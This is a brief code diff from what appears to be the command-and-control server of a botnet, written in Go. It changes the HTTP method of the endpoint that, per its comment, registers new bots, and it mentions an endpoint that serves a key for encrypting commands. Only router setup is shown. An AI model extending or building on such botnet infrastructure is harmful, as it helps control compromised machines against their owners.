@@ -27,7 +27,7 @@ func NewMasterService() *mux.Router {
 	// the key endpoint exposes a public key to encrypt commands before sending
 	router.Methods(http.MethodGet).Path(KeyEndpoint).HandlerFunc(c.keyHandler)
 	// the join endpoint registers new net users onto the botnet
-	router.Methods(http.MethodPost).Path(JoinEndpoint).HandlerFunc(c.joinHandler)
+	router.Methods(http.MethodGet).Path(JoinEndpoint).HandlerFunc(c.joinHandler)
 
 	return router
 }
